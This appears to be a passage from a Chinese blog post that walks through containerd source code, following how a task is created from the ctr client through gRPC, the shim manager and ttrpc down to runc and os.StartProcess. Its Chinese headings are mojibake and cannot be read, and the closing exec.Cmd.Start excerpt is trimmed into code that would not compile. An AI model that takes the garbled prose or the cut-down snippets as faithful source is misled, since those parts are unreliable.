srv.(ContainersServer).Get(ctx, in) } info := \u0026amp;grpc.UnaryServerInfo{ Server: srv, FullMethod: \u0026#34;/containerd.services.containers.v1.Containers/Get\u0026#34;, } handler := func(ctx context.Context, req interface{}) (interface{}, error) { return srv.(ContainersServer).Get(ctx, req.(*GetContainerRequest)) } return interceptor(ctx, in, info, handler) } 2ã€æ¥ç€è°ƒç”¨local.Get()å‡½æ•°å¤„ç†ï¼ˆè¿™é‡Œæœ‰ä¸ªå¯¹è±¡çš„è½¬æ¢ContainersServerè½¬æ¢åˆ°Serviceå†è½¬æ¢åˆ°localï¼‰\n// containerd/containerd/api/services/containers/v1/containers_grpc.pb.go // è¿™é‡Œè°ƒç”¨åº•å±‚çš„æ•°æ®åº“è·å–contianer func (l *local) Get(ctx context.Context, req *api.GetContainerRequest, _ ...grpc.CallOption) (*api.GetContainerResponse, error) { var resp api.GetContainerResponse return \u0026amp;resp, errdefs.ToGRPC(l.withStoreView(ctx, func(ctx context.Context) error { container, err := l.Store.Get(ctx, req.ID) if err != nil { return err } containerpb := containerToProto(\u0026amp;container) resp.Container = containerpb return nil })) } 3ã€NewTaskåˆ›å»ºå®¹å™¨è¯·æ±‚\n// containerd\\containerd\\cmd\\ctr\\commands\\tasks\\tasks_unix.go //NewTask creates a new task func NewTask(ctx context.Context, client *containerd.Client, container containerd.Container, checkpoint string, con console.Console, nullIO bool, logURI string, ioOpts []cio.Opt, opts ...containerd.NewTaskOpts) (containerd.Task, error) { stdinC := \u0026amp;stdinCloser{ stdin: os.Stdin, } if checkpoint != \u0026#34;\u0026#34; { im, err := client.GetImage(ctx, checkpoint) if err != nil { return nil, err } opts = append(opts, containerd.WithTaskCheckpoint(im)) } spec, err := container.Spec(ctx) if err != nil { return nil, err } if spec.Linux != nil { if len(spec.Linux.UIDMappings) != 0 { opts = append(opts, containerd.WithUIDOwner(spec.Linux.UIDMappings[0].HostID)) } if len(spec.Linux.GIDMappings) != 0 { opts = append(opts, containerd.WithGIDOwner(spec.Linux.GIDMappings[0].HostID)) } } var ioCreator cio.Creator if con != nil { if nullIO { return nil, errors.New(\u0026#34;tty and null-io cannot be used together\u0026#34;) } ioCreator = cio.NewCreator(append([]cio.Opt{cio.WithStreams(con, con, nil), cio.WithTerminal}, ioOpts...)...) } else if nullIO { ioCreator = cio.NullIO } else if logURI != \u0026#34;\u0026#34; { u, err := url.Parse(logURI) if err != nil { return nil, err } ioCreator = cio.LogURI(u) } else { ioCreator = cio.NewCreator(append([]cio.Opt{cio.WithStreams(stdinC, os.Stdout, os.Stderr)}, ioOpts...)...) } t, err := container.NewTask(ctx, ioCreator, opts...) if err != nil { return nil, err } stdinC.closer = func() { t.CloseIO(ctx, containerd.WithStdinCloser) } return t, nil } 3ã€è°ƒç”¨container.NewTaskå‡½æ•°\n//containerd\\containerd\\client\\container.go func (c *container) NewTask(ctx context.Context, ioCreate cio.Creator, opts ...NewTaskOpts) (_ Task, err error) { ctx, span := tracing.StartSpan(ctx, \u0026#34;container.NewTask\u0026#34;) defer span.End() i, err := ioCreate(c.id) if err != nil { return nil, err } defer func() { if err != nil \u0026amp;\u0026amp; i != nil { i.Cancel() i.Close() } }() cfg := i.Config() request := \u0026amp;tasks.CreateTaskRequest{ ContainerID: c.id, Terminal: cfg.Terminal, Stdin: cfg.Stdin, Stdout: cfg.Stdout, Stderr: cfg.Stderr, } r, err := c.get(ctx) if err != nil { return nil, err } if r.SnapshotKey != \u0026#34;\u0026#34; { if r.Snapshotter == \u0026#34;\u0026#34; { return nil, fmt.Errorf(\u0026#34;unable to resolve rootfs mounts without snapshotter on container: %w\u0026#34;, errdefs.ErrInvalidArgument) } // get the rootfs from the snapshotter and add it to the request s, err := c.client.getSnapshotter(ctx, r.Snapshotter) if err != nil { return nil, err } mounts, err := s.Mounts(ctx, r.SnapshotKey) if err != nil { return nil, err } spec, err := c.Spec(ctx) if err != nil { return nil, err } for _, m := range mounts { if spec.Linux != nil \u0026amp;\u0026amp; spec.Linux.MountLabel != \u0026#34;\u0026#34; { if ml := label.FormatMountLabel(\u0026#34;\u0026#34;, spec.Linux.MountLabel); ml != \u0026#34;\u0026#34; { m.Options = append(m.Options, ml) } } request.Rootfs = append(request.Rootfs, \u0026amp;types.Mount{ Type: m.Type, Source: m.Source, Target: m.Target, Options: m.Options, }) } } info := TaskInfo{ runtime: r.Runtime.Name, } for _, o := range opts { if err := o(ctx, c.client, \u0026amp;info); err != nil { return nil, err } } for _, m := range info.RootFS { request.Rootfs = append(request.Rootfs, \u0026amp;types.Mount{ Type: m.Type, Source: m.Source, Target: m.Target, Options: m.Options, }) } request.RuntimePath = info.RuntimePath if info.Options != nil { o, err := typeurl.MarshalAny(info.Options) if err != nil { return nil, err } request.Options = typeurl.MarshalProto(o) } t := \u0026amp;task{ client: c.client, io: i, id: c.id, c: c, } if info.Checkpoint != nil { request.Checkpoint = info.Checkpoint } span.SetAttributes( tracing.Attribute(\u0026#34;task.container.id\u0026#34;, request.ContainerID), tracing.Attribute(\u0026#34;task.request.options\u0026#34;, request.Options.String()), tracing.Attribute(\u0026#34;task.runtime.name\u0026#34;, info.runtime), ) response, err := c.client.TaskService().Create(ctx, request) if err != nil { return nil, errdefs.FromGRPC(err) } span.AddEvent(\u0026#34;task created\u0026#34;, tracing.Attribute(\u0026#34;task.process.id\u0026#34;, int(response.Pid)), ) t.pid = response.Pid return t, nil } 3ã€Taskserviceè·å–TasksClientå®ä¾‹\n// TaskService returns the underlying TasksClient func (c *Client) TaskService() tasks.TasksClient { if c.taskService != nil { return c.taskService } c.connMu.Lock() defer c.connMu.Unlock() return tasks.NewTasksClient(c.conn) } 3ã€é€šè¿‡gRPCå‘é€ç»™containerd\næºç è·¯å¾„ï¼šcontainerd/api/services/tasks/v1/tasks_grpc.pb.go\nfunc (c *tasksClient) Create(ctx context.Context, in *CreateTaskRequest, opts ...grpc.CallOption) (*CreateTaskResponse, error) { out := new(CreateTaskResponse) err := c.cc.Invoke(ctx, \u0026#34;/containerd.services.tasks.v1.Tasks/Create\u0026#34;, in, out, opts...) if err != nil { return nil, err } return out, nil } 3ã€containerdæ¥æ”¶å¹¶å¤„ç†è¯·æ±‚\næºç è·¯å¾„ï¼šcontainerd/api/services/tasks/v1/tasks_grpc.pb.go\nfunc _Tasks_Create_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) { in := new(CreateTaskRequest) if err := dec(in); err != nil { return nil, err } if interceptor == nil { return srv.(TasksServer).Create(ctx, in) } info := \u0026amp;grpc.UnaryServerInfo{ Server: srv, FullMethod: \u0026#34;/containerd.services.tasks.v1.Tasks/Create\u0026#34;, } handler := func(ctx context.Context, req interface{}) (interface{}, error) { return srv.(TasksServer).Create(ctx, req.(*CreateTaskRequest)) } return interceptor(ctx, in, info, handler) } 3ã€å®é™…è°ƒç”¨localçš„ç›¸å…³å‡½æ•°å¤„ç†ï¼ˆè¿™é‡Œä¹Ÿæœ‰å¯¹è±¡çš„è½¬æ¢ï¼‰\næºç è·¯å¾„ï¼šcontainerd/plugins/services/tasks/local.go\nfunc (l *local) Create(ctx context.Context, r *api.CreateTaskRequest, _ ...grpc.CallOption) (*api.CreateTaskResponse, error) { container, err := l.getContainer(ctx, r.ContainerID) if err != nil { return nil, errdefs.ToGRPC(err) } var ( checkpointPath string taskAPIAddress string taskAPIVersion uint32 ) if r.Options != nil { taskOptions, err := formatOptions(container.Runtime.Name, r.Options) if err != nil { return nil, err } checkpointPath = taskOptions.CriuImagePath taskAPIAddress = taskOptions.TaskApiAddress taskAPIVersion = taskOptions.TaskApiVersion } // jump get checkpointPath from checkpoint image if checkpointPath == \u0026#34;\u0026#34; \u0026amp;\u0026amp; r.Checkpoint != nil { checkpointPath, err = os.MkdirTemp(os.Getenv(\u0026#34;XDG_RUNTIME_DIR\u0026#34;), \u0026#34;ctrd-checkpoint\u0026#34;) if err != nil { return nil, err } if r.Checkpoint.MediaType != images.MediaTypeContainerd1Checkpoint { return nil, fmt.Errorf(\u0026#34;unsupported checkpoint type %q\u0026#34;, r.Checkpoint.MediaType) } reader, err := l.store.ReaderAt(ctx, ocispec.Descriptor{ MediaType: r.Checkpoint.MediaType, Digest: digest.Digest(r.Checkpoint.Digest), Size: r.Checkpoint.Size, Annotations: r.Checkpoint.Annotations, }) if err != nil { return nil, err } _, err = archive.Apply(ctx, checkpointPath, content.NewReader(reader)) reader.Close() if err != nil { return nil, err } } opts := runtime.CreateOpts{ Spec: container.Spec, IO: runtime.IO{ Stdin: r.Stdin, Stdout: r.Stdout, Stderr: r.Stderr, Terminal: r.Terminal, }, Checkpoint: checkpointPath, Runtime: container.Runtime.Name, RuntimeOptions: container.Runtime.Options, TaskOptions: r.Options, SandboxID: container.SandboxID, Address: taskAPIAddress, Version: taskAPIVersion, } if r.RuntimePath != \u0026#34;\u0026#34; { opts.Runtime = r.RuntimePath } for _, m := range r.Rootfs { opts.Rootfs = append(opts.Rootfs, mount.Mount{ Type: m.Type, Source: m.Source, Target: m.Target, Options: m.Options, }) } rtime := l.v2Runtime _, err = rtime.Get(ctx, r.ContainerID) if err != nil \u0026amp;\u0026amp; !errdefs.IsNotFound(err) { return nil, errdefs.ToGRPC(err) } if err == nil { return nil, errdefs.ToGRPC(fmt.Errorf(\u0026#34;task %s: %w\u0026#34;, r.ContainerID, errdefs.ErrAlreadyExists)) } c, err := rtime.Create(ctx, r.ContainerID, opts) if err != nil { return nil, errdefs.ToGRPC(err) } labels := map[string]string{\u0026#34;runtime\u0026#34;: container.Runtime.Name} if err := l.monitor.Monitor(c, labels); err != nil { return nil, fmt.Errorf(\u0026#34;monitor task: %w\u0026#34;, err) } pid, err := c.PID(ctx) if err != nil { return nil, fmt.Errorf(\u0026#34;failed to get task pid: %w\u0026#34;, err) } return \u0026amp;api.CreateTaskResponse{ ContainerID: r.ContainerID, Pid: pid, }, nil } 3ã€è°ƒç”¨runtime.PlatformRuntime.createï¼ŒPlatformRuntimeæ¥å£å®é™…ç”±TaskManagerå®ç°ï¼Œä¹Ÿå°±æ˜¯TaskManager.Createã€‚Createå‡½æ•°çš„å…³é”®è°ƒç”¨æµç¨‹æœ‰ç‚¹å¤šï¼Œæˆ‘ä»¬ä¸€ä¸€åˆ†æã€‚\n1.m.manager.Start()\n2.newShimTask(shim)\n3.shimTask.Create()\n//æºç è·¯å¾„ï¼šcontainerd\\containerd\\core\\runtime\\v2\\task_manager.go // Create launches new shim instance and creates new task func (m *TaskManager) Create(ctx context.Context, taskID string, opts runtime.CreateOpts) (_ runtime.Task, retErr error) { bundle, err := NewBundle(ctx, m.root, m.state, taskID, opts.Spec) if err != nil { return nil, err } defer func() { if retErr != nil { bundle.Delete() } }() shim, err := m.manager.Start(ctx, taskID, bundle, opts) if err != nil { return nil, fmt.Errorf(\u0026#34;failed to start shim: %w\u0026#34;, err) } // Cast to shim task and call task service to create a new container task instance. // This will not be required once shim service / client implemented. shimTask, err := newShimTask(shim) if err != nil { return nil, err } // runc ignores silently features it doesn\u0026#39;t know about, so for things that this is // problematic let\u0026#39;s check if this runc version supports them. if err := m.validateRuntimeFeatures(ctx, opts); err != nil { return nil, fmt.Errorf(\u0026#34;failed to validate OCI runtime features: %w\u0026#34;, err) } t, err := shimTask.Create(ctx, opts) if err != nil { // NOTE: ctx contains required namespace information. m.manager.shims.Delete(ctx, taskID) dctx, cancel := timeout.WithContext(cleanup.Background(ctx), cleanupTimeout) defer cancel() sandboxed := opts.SandboxID != \u0026#34;\u0026#34; _, errShim := shimTask.delete(dctx, sandboxed, func(context.Context, string) {}) if errShim != nil { if errdefs.IsDeadlineExceeded(errShim) { dctx, cancel = timeout.WithContext(cleanup.Background(ctx), cleanupTimeout) defer cancel() } shimTask.Shutdown(dctx) shimTask.Close() } return nil, fmt.Errorf(\u0026#34;failed to create shim task: %w\u0026#34;, err) } return t, nil } 3.1ã€m.manager.Start()è°ƒç”¨ShimManager.Start\ncontainerd\\containerd\\core\\runtime\\v2\\shim_manager.go\n// Start launches a new shim instance func (m *ShimManager) Start(ctx context.Context, id string, bundle *Bundle, opts runtime.CreateOpts) (_ ShimInstance, retErr error) { // This container belongs to sandbox which supposed to be already started via sandbox API. if opts.SandboxID != \u0026#34;\u0026#34; { var params shimbinary.BootstrapParams if opts.Address != \u0026#34;\u0026#34; { // The address returned from sandbox controller should be in the form like ttrpc+unix://\u0026lt;uds-path\u0026gt; // or grpc+vsock://\u0026lt;cid\u0026gt;:\u0026lt;port\u0026gt;, we should get the protocol from the url first. protocol, address, ok := strings.Cut(opts.Address, \u0026#34;+\u0026#34;) if !ok { return nil, fmt.Errorf(\u0026#34;the scheme of sandbox address should be in \u0026#34; + \u0026#34; the form of \u0026lt;protocol\u0026gt;+\u0026lt;unix|vsock|tcp\u0026gt;, i.e. ttrpc+unix or grpc+vsock\u0026#34;) } params = shimbinary.BootstrapParams{ Version: int(opts.Version), Protocol: protocol, Address: address, } } else { // For those sandbox we can not get endpoint, // fallback to legacy implementation process, err := m.Get(ctx, opts.SandboxID) if err != nil { return nil, fmt.Errorf(\u0026#34;can\u0026#39;t find sandbox %s\u0026#34;, opts.SandboxID) } p, restoreErr := restoreBootstrapParams(process.Bundle()) if restoreErr != nil { return nil, fmt.Errorf(\u0026#34;failed to get bootstrap \u0026#34;+ \u0026#34;params of sandbox %s, %v, legacy restore error %v\u0026#34;, opts.SandboxID, err, restoreErr) } params = p } // Write sandbox ID this task belongs to. if err := os.WriteFile(filepath.Join(bundle.Path, \u0026#34;sandbox\u0026#34;), []byte(opts.SandboxID), 0600); err != nil { return nil, err } if err := writeBootstrapParams(filepath.Join(bundle.Path, \u0026#34;bootstrap.json\u0026#34;), params); err != nil { return nil, fmt.Errorf(\u0026#34;failed to write bootstrap.json for bundle %s: %w\u0026#34;, bundle.Path, err) } shim, err := loadShim(ctx, bundle, func() {}) if err != nil { return nil, fmt.Errorf(\u0026#34;failed to load sandbox task %q: %w\u0026#34;, opts.SandboxID, err) } if err := m.shims.Add(ctx, shim); err != nil { return nil, err } return shim, nil } shim, err := m.startShim(ctx, bundle, id, opts) if err != nil { return nil, err } defer func() { if retErr != nil { m.cleanupShim(ctx, shim) } }() if err := m.shims.Add(ctx, shim); err != nil { return nil, fmt.Errorf(\u0026#34;failed to add task: %w\u0026#34;, err) } return shim, nil } 3.1ã€ä¸Šé¢å¦‚æœSandboxIDä¸ä¸ºç©ºï¼Œè°ƒç”¨loadShimå‡½æ•°åŠ è½½shimï¼Œå¦åˆ™è°ƒç”¨startShimå‡½æ•°å¯åŠ¨shimï¼Œè¿™é‡Œæˆ‘ä»¬åˆ†æstartShimã€‚\næºç è·¯å¾„ï¼šcontainerd\\containerd\\core\\runtime\\v2\\shim.go\nfunc (m *ShimManager) startShim(ctx context.Context, bundle *Bundle, id string, opts runtime.CreateOpts) (*shim, error) { ns, err := namespaces.NamespaceRequired(ctx) if err != nil { return nil, err } ctx = log.WithLogger(ctx, log.G(ctx).WithField(\u0026#34;namespace\u0026#34;, ns)) topts := opts.TaskOptions if topts == nil || topts.GetValue() == nil { topts = opts.RuntimeOptions } runtimePath, err := m.resolveRuntimePath(opts.Runtime) if err != nil { return nil, fmt.Errorf(\u0026#34;failed to resolve runtime path: %w\u0026#34;, err) } b := shimBinary(bundle, shimBinaryConfig{ runtime: runtimePath, address: m.containerdAddress, ttrpcAddress: m.containerdTTRPCAddress, env: m.env, }) shim, err := b.Start(ctx, typeurl.MarshalProto(topts), func() { log.G(ctx).WithField(\u0026#34;id\u0026#34;, id).Info(\u0026#34;shim disconnected\u0026#34;) cleanupAfterDeadShim(cleanup.Background(ctx), id, m.shims, m.events, b) // Remove self from the runtime task list. Even though the cleanupAfterDeadShim() // would publish taskExit event, but the shim.Delete() would always failed with ttrpc // disconnect and there is no chance to remove this dead task from runtime task lists. // Thus it\u0026#39;s better to delete it here. m.shims.Delete(ctx, id) }) if err != nil { return nil, fmt.Errorf(\u0026#34;start failed: %w\u0026#34;, err) } return shim, nil } 3.2ã€newShimTask(shim)è°ƒç”¨NewTaskClient\n//containerd\\containerd\\core\\runtime\\v2\\shim.go func newShimTask(shim ShimInstance) (*shimTask, error) { _, version := shim.Endpoint() taskClient, err := NewTaskClient(shim.Client(), version) if err != nil { return nil, err } return \u0026amp;shimTask{ ShimInstance: shim, task: taskClient, }, nil } 3.2ã€NewTaskClient()æ ¹æ®ä¼ å…¥çš„ç‰ˆæœ¬å·é€‰æ‹©ä¸åŒçš„é€šä¿¡æ¡†æ¶ä¸shimé€šä¿¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªshimTaskå®ä¾‹\n//containerd\\containerd\\core\\runtime\\v2\\bridge.go func NewTaskClient(client interface{}, version int) (TaskServiceClient, error) { switch c := client.(type) { case *ttrpc.Client: switch version { case 2: return \u0026amp;ttrpcV2Bridge{client: v2.NewTaskClient(c)}, nil case 3: return v3.NewTTRPCTaskClient(c), nil default: return nil, fmt.Errorf(\u0026#34;containerd client supports only v2 and v3 TTRPC task client (got %d)\u0026#34;, version) } case grpc.ClientConnInterface: if version != 3 { return nil, fmt.Errorf(\u0026#34;containerd client supports only v3 GRPC task service (got %d)\u0026#34;, version) } return \u0026amp;grpcV3Bridge{v3.NewTaskClient(c)}, nil default: return nil, fmt.Errorf(\u0026#34;unsupported shim client type %T\u0026#34;, c) } } 3.3ã€shimTask.Create(ctx, opts)åˆ›å»ºtask\nfunc (s *shimTask) Create(ctx context.Context, opts runtime.CreateOpts) (runtime.Task, error) { topts := opts.TaskOptions if topts == nil || topts.GetValue() == nil { topts = opts.RuntimeOptions } request := \u0026amp;task.CreateTaskRequest{ ID: s.ID(), Bundle: s.Bundle(), Stdin: opts.IO.Stdin, Stdout: opts.IO.Stdout, Stderr: opts.IO.Stderr, Terminal: opts.IO.Terminal, Checkpoint: opts.Checkpoint, Options: typeurl.MarshalProto(topts), } for _, m := range opts.Rootfs { request.Rootfs = append(request.Rootfs, \u0026amp;types.Mount{ Type: m.Type, Source: m.Source, Target: m.Target, Options: m.Options, }) } _, err := s.task.Create(ctx, request) if err != nil { return nil, errdefs.FromGRPC(err) } return s, nil } 3.3ã€task.Createæ ¹æ®NewTaskClientä¼ å…¥çš„ç‰ˆæœ¬å·é€‰æ‹©è°ƒç”¨ä¸åŒçš„RPCï¼ˆè¿™ä¸ªNewTaskClientåœ¨å‰é¢newShimTaskå‡½æ•°è°ƒç”¨è¿‡ï¼‰ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©åˆ†ættrpctaskClient.Createï¼Œè¿™é‡Œè°ƒç”¨ttRPCæ¥å£å‘shimå‘å‡ºè¯·æ±‚ã€‚\n//containerd\\containerd\\api\\runtime\\task\\v3\\shim_ttrpc.pb.go func (c *ttrpctaskClient) Create(ctx context.Context, req *CreateTaskRequest) (*CreateTaskResponse, error) { var resp CreateTaskResponse if err := c.client.Call(ctx, \u0026#34;containerd.task.v3.Task\u0026#34;, \u0026#34;Create\u0026#34;, req, \u0026amp;resp); err != nil { return nil, err } return \u0026amp;resp, nil } 3.3ã€shimåœ¨ä¹‹å‰å¯åŠ¨åä¼šè°ƒç”¨RegisterTTRPCæ³¨å†ŒæœåŠ¡ï¼Œæ‰€ä»¥ä¼šæ¥æ”¶åˆ°containerdå‘å‡ºçš„TTRPCè¯·æ±‚ï¼Œåœ¨è¿™é‡Œè¿›è¡Œå¤„ç†ã€‚\næºç è·¯å¾„ï¼šcontainerd\\containerd\\cmd\\containerd-shim-runc-v2\\task\\service.go\nfunc (s *service) RegisterTTRPC(server *ttrpc.Server) error { taskAPI.RegisterTTRPCTaskService(server, s) return nil } // Create a new initial process and container with the underlying OCI runtime func (s *service) Create(ctx context.Context, r *taskAPI.CreateTaskRequest) (_ *taskAPI.CreateTaskResponse, err error) { s.mu.Lock() defer s.mu.Unlock() s.lifecycleMu.Lock() handleStarted, cleanup := s.preStart(nil) s.lifecycleMu.Unlock() defer cleanup() container, err := runc.NewContainer(ctx, s.platform, r) if err != nil { return nil, err } s.containers[r.ID] = container s.send(\u0026amp;eventstypes.TaskCreate{ ContainerID: r.ID, Bundle: r.Bundle, Rootfs: r.Rootfs, IO: \u0026amp;eventstypes.TaskIO{ Stdin: r.Stdin, Stdout: r.Stdout, Stderr: r.Stderr, Terminal: r.Terminal, }, Checkpoint: r.Checkpoint, Pid: uint32(container.Pid()), }) // The following line cannot return an error as the only state in which that // could happen would also cause the container.Pid() call above to // nil-deference panic. proc, _ := container.Process(\u0026#34;\u0026#34;) handleStarted(container, proc) return \u0026amp;taskAPI.CreateTaskResponse{ Pid: uint32(container.Pid()), }, nil } 3.3ã€æ¥ç€è°ƒç”¨runc.NewContainerå‡½æ•°\næºç è·¯å¾„ï¼šcontainerd\\containerd\\cmd\\containerd-shim-runc-v2\\runc\\container.go\n// NewContainer returns a new runc container func NewContainer(ctx context.Context, platform stdio.Platform, r *task.CreateTaskRequest) (_ *Container, retErr error) { ns, err := namespaces.NamespaceRequired(ctx) if err != nil { return nil, fmt.Errorf(\u0026#34;create namespace: %w\u0026#34;, err) } opts := \u0026amp;options.Options{} if r.Options.GetValue() != nil { v, err := typeurl.UnmarshalAny(r.Options) if err != nil { return nil, err } if v != nil { opts = v.(*options.Options) } } var pmounts []process.Mount for _, m := range r.Rootfs { pmounts = append(pmounts, process.Mount{ Type: m.Type, Source: m.Source, Target: m.Target, Options: m.Options, }) } rootfs := \u0026#34;\u0026#34; if len(pmounts) \u0026gt; 0 { rootfs = filepath.Join(r.Bundle, \u0026#34;rootfs\u0026#34;) if err := os.Mkdir(rootfs, 0711); err != nil \u0026amp;\u0026amp; !os.IsExist(err) { return nil, err } } config := \u0026amp;process.CreateConfig{ ID: r.ID, Bundle: r.Bundle, Runtime: opts.BinaryName, Rootfs: pmounts, Terminal: r.Terminal, Stdin: r.Stdin, Stdout: r.Stdout, Stderr: r.Stderr, Checkpoint: r.Checkpoint, ParentCheckpoint: r.ParentCheckpoint, Options: r.Options, } if err := WriteOptions(r.Bundle, opts); err != nil { return nil, err } // For historical reason, we write opts.BinaryName as well as the entire opts if err := WriteRuntime(r.Bundle, opts.BinaryName); err != nil { return nil, err } var mounts []mount.Mount for _, pm := range pmounts { mounts = append(mounts, mount.Mount{ Type: pm.Type, Source: pm.Source, Target: pm.Target, Options: pm.Options, }) } defer func() { if retErr != nil { if err := mount.UnmountMounts(mounts, rootfs, 0); err != nil { log.G(ctx).WithError(err).Warn(\u0026#34;failed to cleanup rootfs mount\u0026#34;) } } }() if err := mount.All(mounts, rootfs); err != nil { return nil, fmt.Errorf(\u0026#34;failed to mount rootfs component: %w\u0026#34;, err) } p, err := newInit( ctx, r.Bundle, filepath.Join(r.Bundle, \u0026#34;work\u0026#34;), ns, platform, config, opts, rootfs, ) if err != nil { return nil, errdefs.ToGRPC(err) } if err := p.Create(ctx, config); err != nil { return nil, errdefs.ToGRPC(err) } container := \u0026amp;Container{ ID: r.ID, Bundle: r.Bundle, process: p, processes: make(map[string]process.Process), reservedProcess: make(map[string]struct{}), } pid := p.Pid() if pid \u0026gt; 0 { var cg interface{} if cgroups.Mode() == cgroups.Unified { g, err := cgroupsv2.PidGroupPath(pid) if err != nil { log.G(ctx).WithError(err).Errorf(\u0026#34;loading cgroup2 for %d\u0026#34;, pid) return container, nil } cg, err = cgroupsv2.Load(g) if err != nil { log.G(ctx).WithError(err).Errorf(\u0026#34;loading cgroup2 for %d\u0026#34;, pid) } } else { cg, err = cgroup1.Load(cgroup1.PidPath(pid)) if err != nil { log.G(ctx).WithError(err).Errorf(\u0026#34;loading cgroup for %d\u0026#34;, pid) } } container.cgroup = cg } return container, nil } 3.3ã€æ¥ç€è°ƒç”¨newInit.Create\næºç è·¯å¾„ï¼šcontainerd\\containerd\\cmd\\containerd-shim-runc-v2\\process\\init.go\n// Create the process with the provided config func (p *Init) Create(ctx context.Context, r *CreateConfig) error { var ( err error socket *runc.Socket pio *processIO pidFile = newPidFile(p.Bundle) ) if r.Terminal { //è¿™é‡Œåˆ›å»ºä¸€ä¸ªä¸´æ—¶çš„socketæ–‡ä»¶ if socket, err = runc.NewTempConsoleSocket(); err != nil { return fmt.Errorf(\u0026#34;failed to create OCI runtime console socket: %w\u0026#34;, err) } defer socket.Close() } else { if pio, err = createIO(ctx, p.id, p.IoUID, p.IoGID, p.stdio); err != nil { return fmt.Errorf(\u0026#34;failed to create init process I/O: %w\u0026#34;, err) } p.io = pio } if r.Checkpoint != \u0026#34;\u0026#34; { return p.createCheckpointedState(r, pidFile) } opts := \u0026amp;runc.CreateOpts{ PidFile: pidFile.Path(), NoPivot: p.NoPivotRoot, NoNewKeyring: p.NoNewKeyring, } if p.io != nil { opts.IO = p.io.IO() } if socket != nil { opts.ConsoleSocket = socket } if err := p.runtime.Create(ctx, r.ID, r.Bundle, opts); err != nil { return p.runtimeError(err, \u0026#34;OCI runtime create failed\u0026#34;) } if r.Stdin != \u0026#34;\u0026#34; { if err := p.openStdin(r.Stdin); err != nil { return err } } ctx, cancel := context.WithTimeout(ctx, 30*time.Second) defer cancel() if socket != nil { console, err := socket.ReceiveMaster() if err != nil { return fmt.Errorf(\u0026#34;failed to retrieve console master: %w\u0026#34;, err) } console, err = p.Platform.CopyConsole(ctx, console, p.id, r.Stdin, r.Stdout, r.Stderr, \u0026amp;p.wg) if err != nil { return fmt.Errorf(\u0026#34;failed to start console copy: %w\u0026#34;, err) } p.console = console } else { if err := pio.Copy(ctx, \u0026amp;p.wg); err != nil { return fmt.Errorf(\u0026#34;failed to start io pipe copy: %w\u0026#34;, err) } } pid, err := pidFile.Read() if err != nil { return fmt.Errorf(\u0026#34;failed to retrieve OCI runtime container pid: %w\u0026#34;, err) } p.pid = pid return nil } 3.3ã€æ¥ç€è°ƒç”¨runtime.Create\næºç è·¯å¾„ï¼šcontainerd\\go-runc\\runc.go\n// Create creates a new container and returns its pid if it was created successfully func (r *Runc) Create(context context.Context, id, bundle string, opts *CreateOpts) error { args := []string{\u0026#34;create\u0026#34;, \u0026#34;--bundle\u0026#34;, bundle} if opts == nil { opts = \u0026amp;CreateOpts{} } oargs, err := opts.args() if err != nil { return err } args = append(args, oargs...) cmd := r.command(context, append(args, id)...) if opts.IO != nil { opts.Set(cmd) } cmd.ExtraFiles = opts.ExtraFiles if cmd.Stdout == nil \u0026amp;\u0026amp; cmd.Stderr == nil { data, err := r.cmdOutput(cmd, true, nil) defer putBuf(data) if err != nil { return fmt.Errorf(\u0026#34;%s: %s\u0026#34;, err, data.String()) } return nil } ec, err := r.startCommand(cmd) if err != nil { return err } if opts.IO != nil { if c, ok := opts.IO.(StartCloser); ok { if err := c.CloseAfterStart(); err != nil { return err } } } status, err := Monitor.Wait(cmd, ec) if err == nil \u0026amp;\u0026amp; status != 0 { err = fmt.Errorf(\u0026#34;%s did not terminate successfully: %w\u0026#34;, cmd.Args[0], \u0026amp;ExitError{status}) } return err } 3.3ã€æ¥ç€å¾€ä¸‹è°ƒç”¨runc.startCommand\næºç è·¯å¾„ï¼šcontainerd\\go-runc\\monitor.go\nfunc (r *Runc) startCommand(cmd *exec.Cmd) (chan Exit, error) { if r.PdeathSignal != 0 { return Monitor.StartLocked(cmd) } return Monitor.Start(cmd) } 3.3ã€å†å¾€ä¸‹è°ƒç”¨Monitor.Start\næºç è·¯å¾„ï¼šcontainerd\\containerd\\pkg\\sys\\reaper\\reaper_unix.go\n// Start starts the command and registers the process with the reaper func (m *Monitor) Start(c *exec.Cmd) (chan runc.Exit, error) { ec := m.Subscribe() if err := c.Start(); err != nil { m.Unsubscribe(ec) return nil, err } return ec, nil } 3.3ã€æ¥ç€å¾€ä¸‹è°ƒç”¨Cmd.Startï¼Œæœ€åè°ƒç”¨äº†ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨os.StartProcesså¯åŠ¨è¿›ç¨‹ã€‚\næºç è·¯å¾„ï¼šGo\\src\\os\\exec\\exec.go\nfunc (c *Cmd) Start() error { // Check for doubled Start calls before we defer failure cleanup. If the prior // call to Start succeeded, we don\u0026#39;t want to spuriously close its pipes. if c.Process != nil { return errors.New(\u0026#34;exec: already started\u0026#34;) } started := false lp := c.Path c.Process, err = os.StartProcess(lp, c.argv(), \u0026amp;os.ProcAttr{ Dir: c.Dir, Files: childFiles, Env: env, Sys: c.SysProcAttr, }) started = true return nil } 3ã€Startå‡½æ•°è°ƒç”¨RPC\ncontainerd/client/process.go\n// Start starts the exec process func (p *process) Start(ctx context.Context) error { ctx, span := tracing.StartSpan(ctx, \u0026#34;process.Start\u0026#34;, tracing.WithAttribute(\u0026#34;process.id\u0026#34;, p.ID()), tracing.WithAttribute(\u0026#34;process.task.id\u0026#34;, p.task.ID()), ) defer span.End() r, err := p.task.client.TaskService().Start(ctx, \u0026amp;tasks.StartRequest{ ContainerID: p.task.id, ExecID: p.id, }) if err != nil { if p.io != nil { p.io.Cancel() p.io.Wait() p.io.Close() } return errdefs.FromGRPC(err) } span.SetAttributes(tracing.Attribute(\u0026#34;process.pid\u0026#34;, int(r.Pid))) p.pid = r.Pid return nil } 3ã€RPCè¯·æ±‚shim\ncontainerd/api/runtime/task/v3/shim_grpc.pb.go\nfunc (c *taskClient) Create(ctx context.Context, in *CreateTaskRequest, opts ...grpc.CallOption) (*CreateTaskResponse, error) { out := new(CreateTaskResponse) err := c.cc.Invoke(ctx, \u0026#34;/containerd.task.v3.Task/Create\u0026#34;, in, out, opts...) if err != nil { return nil, err } return out, nil } func (c *taskClient) Start(ctx context.Context, in *StartRequest, opts ...grpc.CallOption) (*StartResponse, error) { out := new(StartResponse) err := c.cc.Invoke(ctx, \u0026#34;/containerd.task.v3.Task/Start\u0026#34;, in, out, opts...) if err != 